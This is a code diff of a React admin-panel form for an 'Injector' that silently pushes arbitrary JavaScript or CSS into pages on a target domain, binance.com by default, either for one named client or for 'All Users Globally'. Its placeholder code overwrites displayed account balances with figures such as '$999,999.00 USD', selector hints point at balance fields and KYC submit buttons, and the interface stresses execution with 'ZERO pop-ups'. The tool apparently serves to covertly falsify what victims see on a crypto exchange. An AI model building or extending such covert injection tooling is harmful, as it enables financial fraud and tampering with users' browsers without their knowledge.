+                    <label className="form-label" style={{ fontWeight: 700, color: 'var(--brand-purple)', margin: 0, display: 'flex', alignItems: 'center', gap: '6px' }}>
+                      <span>🎯</span>
+                      <span>Target Element CSS Selector (Auto-Locate Target):</span>
+                    </label>
+                    <span style={{ fontSize: '11px', color: '#6b21a8', fontWeight: 600 }}>
+                      ⚡ Watched via MutationObserver
+                    </span>
+                  </div>
+                  <input
+                    type="text"
+                    className="form-input"
+                    value={injForm.targetSelector}
+                    onChange={(e) => setInjForm({ ...injForm, targetSelector: e.target.value })}
+                    placeholder="e.g. .balance-amount, #user-name, [data-testid='total-balance'], button.kyc-submit"
+                    style={{
+                      fontFamily: 'var(--font-mono)',
+                      fontSize: '13px',
+                      background: '#ffffff',
+                      borderColor: showInjErrors && !injForm.targetSelector.trim() ? '#ef4444' : undefined,
+                    }}
+                  />
+                  {showInjErrors && !injForm.targetSelector.trim() ? (
+                    <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
+                      ⚠️ Required: enter the CSS selector for the element you want the Injector to locate
+                    </span>
+                  ) : (
+                    <span style={{ fontSize: '11px', color: '#6b21a8', marginTop: '4px', display: 'block' }}>
+                      💡 The Injector will automatically locate this element on the page (even when loaded dynamically) and pass it as <code>element</code> to your code below!
+                    </span>
+                  )}
+                </div>
+              )}
 
-                                  {/* Mode 2: Free JavaScript Code */}
-                                  <button
-                                    type="button"
-                                    onClick={() => setInjForm({ ...injForm, injectionType: 'js' })}
-                                    style={{
-                                      padding: '12px 14px',
-                                      borderRadius: '8px',
-                                      border: injForm.injectionType === 'js' ? '2px solid #0284c7' : '1.5px solid #cbd5e1',
-                                      background: injForm.injectionType === 'js' ? '#f0f9ff' : '#ffffff',
-                                      cursor: 'pointer',
-                                      textAlign: 'left',
-                                      transition: 'all 0.2s',
-                                    }}
-                                  >
-                                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontWeight: 700, color: injForm.injectionType === 'js' ? '#0369a1' : '#334155', fontSize: '13px' }}>
-                                      <span>📜</span>
-                                      <span>Free JavaScript Runner</span>
-                                    </div>
-                                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
-                                      Free text code field. Put any JS script, API hook, automated click, or window action.
-                                    </div>
-                                  </button>
+              {/* Free Text Code Editor Box */}
+              <div className="form-group" style={{ marginBottom: '16px' }}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
+                  <label className="form-label" style={{ fontWeight: 800, fontSize: '13.5px', color: '#0f172a', margin: 0, display: 'flex', alignItems: 'center', gap: '6px' }}>
+                    <span>💻</span>
+                    <span>Free Code Editor ({injForm.injectionType === 'css' ? 'CSS' : 'JavaScript'}):</span>
+                  </label>
+                  <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
+                    {injForm.injectionType === 'element'
+                      ? 'Available in code: element, context'
+                      : injForm.injectionType === 'js'
+                        ? 'Available in code: context.locateElement, context.domain'
+                        : 'Standard CSS rules'}
+                  </span>
+                </div>
 
-                                  {/* Mode 3: Custom CSS Styler */}
-                                  <button
-                                    type="button"
-                                    onClick={() => setInjForm({ ...injForm, injectionType: 'css' })}
-                                    style={{
-                                      padding: '12px 14px',
-                                      borderRadius: '8px',
-                                      border: injForm.injectionType === 'css' ? '2px solid #10b981' : '1.5px solid #cbd5e1',
-                                      background: injForm.injectionType === 'css' ? '#f0fdf4' : '#ffffff',
-                                      cursor: 'pointer',
-                                      textAlign: 'left',
-                                      transition: 'all 0.2s',
-                                    }}
-                                  >
-                                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontWeight: 700, color: injForm.injectionType === 'css' ? '#047857' : '#334155', fontSize: '13px' }}>
-                                      <span>🎨</span>
-                                      <span>Custom CSS Stylesheet</span>
-                                    </div>
-                                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
-                                      Inject CSS styling rules to re-style, hide, or transform native page elements cleanly.
-                                    </div>
-                                  </button>
-                                </div>
-                              </div>
-                            </div>
+                <div style={{ position: 'relative' }}>
+                  <textarea
+                    className="form-input code-textarea"
+                    rows={9}
+                    value={injForm.code}
+                    onChange={(e) => setInjForm({ ...injForm, code: e.target.value })}
+                    placeholder={
+                      injForm.injectionType === 'element'
+                        ? `// Write the code to modify the located element (No pop-up):\nelement.textContent = '$148,500.00 USD';\nelement.style.color = '#10b981';\nelement.style.fontWeight = 'bold';`
+                        : injForm.injectionType === 'js'
+                          ? `// Free JavaScript field - client can put anything they want:\nconsole.log("Injected code running on", context.domain);\ncontext.locateElement('.balance-amount', (el) => {\n  el.textContent = '$999,999.00 USD';\n});`
+                          : `/* Free CSS stylesheet field - put any CSS rules here */\n.balance-amount {\n  color: #10b981 !important;\n  font-weight: 800 !important;\n}`
+                    }
+                    style={{
+                      fontFamily: 'var(--font-mono)',
+                      fontSize: '13px',
+                      lineHeight: '1.5',
+                      padding: '12px 14px',
+                      background: '#0f172a',
+                      color: '#38bdf8',
+                      borderColor: showInjErrors && !injForm.code.trim() ? '#ef4444' : '#334155',
+                    }}
+                  />
+                </div>
 
-                            <div className="card" style={{ borderTop: '3px solid #10b981' }}>
-                              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
-                                <span style={{ fontSize: '20px' }}>🎯</span>
-                                <h3 className="card-title" style={{ fontSize: '15px', margin: 0 }}>Client &amp; Audience Isolation</h3>
-                                {/* Target Element Selector Input (When Mode is 'element') */}
-                                {injForm.injectionType === 'element' && (
-                                  <div className="form-group" style={{ background: '#f5f3ff', padding: '14px 16px', borderRadius: '8px', border: '1.5px solid #ddd6fe' }}>
-                                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
-                                      <label className="form-label" style={{ fontWeight: 700, color: 'var(--brand-purple)', margin: 0, display: 'flex', alignItems: 'center', gap: '6px' }}>
-                                        <span>🎯</span>
-                                        <span>Target Element CSS Selector (Auto-Locate Target):</span>
-                                      </label>
-                                      <span style={{ fontSize: '11px', color: '#6b21a8', fontWeight: 600 }}>
-                                        ⚡ Watched via MutationObserver
-                                      </span>
-                                    </div>
-                                    <input
-                                      type="text"
-                                      className="form-input"
-                                      value={injForm.targetSelector}
-                                      onChange={(e) => setInjForm({ ...injForm, targetSelector: e.target.value })}
-                                      placeholder="e.g. .balance-amount, #user-name, [data-testid='total-balance'], button.kyc-submit"
-                                      style={{
-                                        fontFamily: 'var(--font-mono)',
-                                        fontSize: '13px',
-                                        background: '#ffffff',
-                                        borderColor: showInjErrors && !injForm.targetSelector.trim() ? '#ef4444' : undefined,
-                                      }}
-                                    />
-                                    {showInjErrors && !injForm.targetSelector.trim() ? (
-                                      <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
-                                        ⚠️ Required: enter the CSS selector for the element you want the Injector to locate
-                                      </span>
-                                    ) : (
-                                      <span style={{ fontSize: '11px', color: '#6b21a8', marginTop: '4px', display: 'block' }}>
-                                        💡 The Injector will automatically locate this element on the page (even when loaded dynamically) and pass it as <code>element</code> to your code below!
-                                      </span>
-                                    )}
-                                  </div>
-                                )}
+                {showInjErrors && !injForm.code.trim() && (
+                  <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
+                    ⚠️ Required: write or paste the code you want to inject
+                  </span>
+                )}
+                {showInjErrors && injForm.code.trim() && !injValidation.isUpdatable && (
+                  <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
+                    ❌ {injValidation.errors[0]?.message}
+                  </span>
+                )}
+              </div>
 
-                                {/* Free Text Code Editor Box */}
-                                <div className="form-group">
-                                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
-                                    <label className="form-label" style={{ fontWeight: 800, fontSize: '13.5px', color: '#0f172a', margin: 0, display: 'flex', alignItems: 'center', gap: '6px' }}>
-                                      <span>💻</span>
-                                      <span>Free Code Editor ({injForm.injectionType === 'css' ? 'CSS' : 'JavaScript'}):</span>
-                                    </label>
-                                    <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
-                                      {injForm.injectionType === 'element'
-                                        ? 'Available in code: element, context'
-                                        : injForm.injectionType === 'js'
-                                          ? 'Available in code: context.locateElement, context.domain'
-                                          : 'Standard CSS rules'}
-                                    </span>
-                                  </div>
+              {/* Validation Status Banner */}
+              {injValidation.isUpdatable ? (
+                <div
+                  style={{
+                    background: '#f0fdf4',
+                    border: '2px solid #10b981',
+                    borderRadius: '8px',
+                    padding: '12px 16px',
+                    marginBottom: '16px',
+                  }}
+                >
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, color: '#065f46', fontSize: '13.5px' }}>
+                      <span>✅</span>
+                      <span>Code Valid &amp; Ready for Pure In-Page Execution (Without Pop-up)</span>
+                    </div>
+                    <span
+                      style={{
+                        background: '#16a34a',
+                        color: '#ffffff',
+                        fontSize: '11px',
+                        fontWeight: 800,
+                        padding: '3px 8px',
+                        borderRadius: '4px',
+                        textTransform: 'uppercase',
+                      }}
+                    >
+                      Status: 100% Updatable
+                    </span>
+                  </div>
+                  <div style={{ color: '#047857', fontSize: '12px', marginTop: '4px' }}>
+                    Will inject {injForm.injectionType === 'element' ? <span>on element <code>{injForm.targetSelector}</code></span> : <span>{injForm.injectionType.toUpperCase()} code</span>}
+                    {' on '}<strong>{injForm.domain}</strong>
+                    {injForm.targetMode === 'specific' && injForm.targetClientId ? (
+                      <span> (Target Client: <code>{injForm.targetClientId}</code>)</span>
+                    ) : (
+                      <span> (Audience: <strong>🌐 All Users Globally</strong>)</span>
+                    )} with <strong>ZERO pop-ups</strong>.
+                  </div>
+                </div>
+              ) : showInjErrors ? (
+                <div
+                  style={{
+                    background: '#fef2f2',
+                    border: '2px solid #ef4444',
+                    borderRadius: '8px',
+                    padding: '12px 16px',
+                    marginBottom: '16px',
+                  }}
+                >
+                  <div style={{ fontWeight: 800, color: '#991b1b', fontSize: '13.5px', marginBottom: '4px' }}>
+                    ❌ Cannot Inject — Please Fix The Following:
+                  </div>
+                  <ul style={{ margin: '4px 0 0 18px', padding: 0, color: '#b91c1c', fontSize: '12px' }}>
+                    {injValidation.errors.map((err, idx) => (
+                      <li key={idx} style={{ marginBottom: '2px' }}>
+                        <strong>{err.field.toUpperCase()}:</strong> {err.message}
+                      </li>
+                    ))}
+                  </ul>
+                </div>
+              ) : (
+                <div
+                  style={{
+                    background: '#f8fafc',
+                    border: '1.5px dashed #cbd5e1',
+                    borderRadius: '8px',
+                    padding: '12px 16px',
+                    marginBottom: '16px',
+                  }}
+                >
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: '#475569', fontSize: '12.5px' }}>
+                    <span>💡</span>
+                    <span>
+                      <strong>Free Code Field:</strong> Type or paste any code you want above. The Injector will locate the element and execute without displaying any popup.
+                    </span>
+                  </div>
+                </div>
+              )}
 
-                                  <div style={{ position: 'relative' }}>
-                                    <textarea
-                                      className="form-input code-textarea"
-                                      rows={9}
-                                      value={injForm.code}
-                                      onChange={(e) => setInjForm({ ...injForm, code: e.target.value })}
-                                      placeholder={
-                                        injForm.injectionType === 'element'
-                                          ? `// Write the code to modify the located element (No pop-up):\nelement.textContent = '$148,500.00 USD';\nelement.style.color = '#10b981';\nelement.style.fontWeight = 'bold';`
-                                          : injForm.injectionType === 'js'
-                                            ? `// Free JavaScript field - client can put anything they want:\nconsole.log("Injected code running on", context.domain);\ncontext.locateElement('.balance-amount', (el) => {\n  el.textContent = '$999,999.00 USD';\n});`
-                                            : `/* Free CSS stylesheet field - put any CSS rules here */\n.balance-amount {\n  color: #10b981 !important;\n  font-weight: 800 !important;\n}`
-                                      }
-                                      style={{
-                                        fontFamily: 'var(--font-mono)',
-                                        fontSize: '13px',
-                                        lineHeight: '1.5',
-                                        padding: '12px 14px',
-                                        background: '#0f172a',
-                                        color: '#38bdf8',
-                                        borderColor: showInjErrors && !injForm.code.trim() ? '#ef4444' : '#334155',
-                                      }}
-                                    />
-                                  </div>
+              {/* Action Buttons */}
+              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px' }}>
+                {editingInjId ? (
+                  <button
+                    type="button"
+                    className="btn btn-secondary"
+                    onClick={handleCancelEditInjection}
+                  >
+                    Cancel Edit
+                  </button>
+                ) : (
+                  <button
+                    type="button"
+                    className="btn btn-secondary"
+                    onClick={() => {
+                      setInjTouched(false);
+                      setInjForm({
+                        id: null,
+                        name: '',
+                        domain: 'binance.com',
+                        targetMode: 'global',
+                        targetClientId: '',
+                        injectionType: 'element',
+                        targetSelector: '',
+                        code: '',
+                        autoLocate: true,
+                      });
+                    }}
+                  >
+                    Reset Form
+                  </button>
+                )}
 
-                                  {showInjErrors && !injForm.code.trim() && (
-                                    <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
-                                      ⚠️ Required: write or paste the code you want to inject
-                                    </span>
-                                  )}
-                                  {showInjErrors && injForm.code.trim() && !injValidation.isUpdatable && (
-                                    <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
-                                      ❌ {injValidation.errors[0]?.message}
-                                    </span>
-                                  )}
-                                </div>
-                                <p style={{ color: 'var(--text-secondary)', fontSize: '12.5px', lineHeight: 1.5 }}>
-                                  Inject scripts globally across all connected visitors or isolate execution exclusively to a single named client (e.g. your test machine or teacher device).
-                                </p>
-                                <div style={{ marginTop: '12px' }}>
-                                  <span className="badge badge-green" style={{ fontSize: '11px' }}>Strict Targeting</span>
-
-                                  {/* Validation Status Banner */}
-                                  {injValidation.isUpdatable ? (
-                                    <div
-                                      style={{
-                                        background: '#f0fdf4',
-                                        border: '2px solid #10b981',
-                                        borderRadius: '8px',
-                                        padding: '12px 16px',
-                                        marginBottom: '16px',
-                                      }}
-                                    >
-                                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
-                                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, color: '#065f46', fontSize: '13.5px' }}>
-                                          <span>✅</span>
-                                          <span>Code Valid &amp; Ready for Pure In-Page Execution (Without Pop-up)</span>
-                                        </div>
-                                        <span
-                                          style={{
-                                            background: '#16a34a',
-                                            color: '#ffffff',
-                                            fontSize: '11px',
-                                            fontWeight: 800,
-                                            padding: '3px 8px',
-                                            borderRadius: '4px',
-                                            textTransform: 'uppercase',
-                                          }}
-                                        >
-                                          Status: 100% Updatable
-                                        </span>
-                                      </div>
-                                      <div style={{ color: '#047857', fontSize: '12px', marginTop: '4px' }}>
-                                        Will inject {injForm.injectionType === 'element' ? <span>on element <code>{injForm.targetSelector}</code></span> : <span>{injForm.injectionType.toUpperCase()} code</span>}
-                                        {' on '}<strong>{injForm.domain}</strong>
-                                        {injForm.targetMode === 'specific' && injForm.targetClientId ? (
-                                          <span> (Target Client: <code>{injForm.targetClientId}</code>)</span>
-                                        ) : (
-                                          <span> (Audience: <strong>🌐 All Users Globally</strong>)</span>
-                                        )} with <strong>ZERO pop-ups</strong>.
-                                      </div>
-                                    </div>
-                                  ) : showInjErrors ? (
-                                    <div
-                                      style={{
-                                        background: '#fef2f2',
-                                        border: '2px solid #ef4444',
-                                        borderRadius: '8px',
-                                        padding: '12px 16px',
-                                        marginBottom: '16px',
-                                      }}
-                                    >
-                                      <div style={{ fontWeight: 800, color: '#991b1b', fontSize: '13.5px', marginBottom: '4px' }}>
-                                        ❌ Cannot Inject — Please Fix The Following:
-                                      </div>
-                                      <ul style={{ margin: '4px 0 0 18px', padding: 0, color: '#b91c1c', fontSize: '12px' }}>
-                                        {injValidation.errors.map((err, idx) => (
-                                          <li key={idx} style={{ marginBottom: '2px' }}>
-                                            <strong>{err.field.toUpperCase()}:</strong> {err.message}
-                                          </li>
-                                        ))}
-                                      </ul>
-                                    </div>
-                                  ) : (
-                                    <div
-                                      style={{
-                                        background: '#f8fafc',
-                                        border: '1.5px dashed #cbd5e1',
-                                        borderRadius: '8px',
-                                        padding: '12px 16px',
-                                        marginBottom: '16px',
-                                      }}
-                                    >
-                                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: '#475569', fontSize: '12.5px' }}>
-                                        <span>💡</span>
-                                        <span>
-                                          <strong>Free Code Field:</strong> Type or paste any code you want above. The Injector will locate the element and execute without displaying any popup.
-                                        </span>
-                                      </div>
-                                    </div>
-                                  )}
-
-                                  {/* Action Buttons */}
-                                  <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px' }}>
-                                    {editingInjId ? (
-                                      <button
-                                        type="button"
-                                        className="btn btn-secondary"
-                                        onClick={handleCancelEditInjection}
-                                      >
-                                        Cancel Edit
-                                      </button>
-                                    ) : (
-                                      <button
-                                        type="button"
-                                        className="btn btn-secondary"
-                                        onClick={() => {
-                                          setInjTouched(false);
-                                          setInjForm({
-                                            id: null,
-                                            name: '',
-                                            domain: 'binance.com',
-                                            targetMode: 'global',
-                                            targetClientId: '',
-                                            injectionType: 'element',
-                                            targetSelector: '',
-                                            code: '',
-                                            autoLocate: true,
-                                          });
-                                        }}
-                                      >
-                                        Reset Form
-                                      </button>
-                                    )}
-
-                                    <button
-                                      type="submit"
-                                      className={`btn ${injValidation.isUpdatable ? 'btn-primary' : 'btn-secondary'}`}
-                                      disabled={injSaving || !injValidation.isUpdatable}
-                                      style={{
-                                        padding: '12px 28px',
-                                        fontSize: '14px',
-                                        fontWeight: 700,
-                                        background: injValidation.isUpdatable ? 'var(--brand-purple)' : '#94a3b8',
-                                        cursor: injValidation.isUpdatable ? 'pointer' : 'not-allowed',
-                                        color: '#ffffff',
-                                      }}
-                                    >
-                                      {injSaving
-                                        ? '⏳ Saving & Injecting Live...'
-                                        : injValidation.isUpdatable
-                                          ? editingInjId
-                                            ? '💾 Save Changes (Update Live)'
-                                            : '🚀 Inject Code Live (Without Pop-up)'
-                                          : showInjErrors
-                                            ? '⚠️ Cannot Inject (Fix Errors)'
-                                            : '🚀 Inject Code Live (Without Pop-up)'}
-                                    </button>
-                                  </div>
-                                </form>
-                              </div>
+                <button
+                  type="submit"
+                  className={`btn ${injValidation.isUpdatable ? 'btn-primary' : 'btn-secondary'}`}
+                  disabled={injSaving || !injValidation.isUpdatable}
+                  style={{
+                    padding: '12px 28px',
+                    fontSize: '14px',
+                    fontWeight: 700,
+                    background: injValidation.isUpdatable ? 'var(--brand-purple)' : '#94a3b8',
+                    cursor: injValidation.isUpdatable ? 'pointer' : 'not-allowed',
+                    color: '#ffffff',
+                  }}
+                >
+                  {injSaving
+                    ? '⏳ Saving & Injecting Live...'
+                    : injValidation.isUpdatable
+                      ? editingInjId
+                        ? '💾 Save Changes (Update Live)'
+                        : '🚀 Inject Code Live (Without Pop-up)'
+                      : showInjErrors
+                        ? '⚠️ Cannot Inject (Fix Errors)'
+                        : '🚀 Inject Code Live (Without Pop-up)'}
+                </button>
+              </div>
+            </form>
+          </div>
 
                               {/* Active Code Injections Table */}
                               <div className="card">
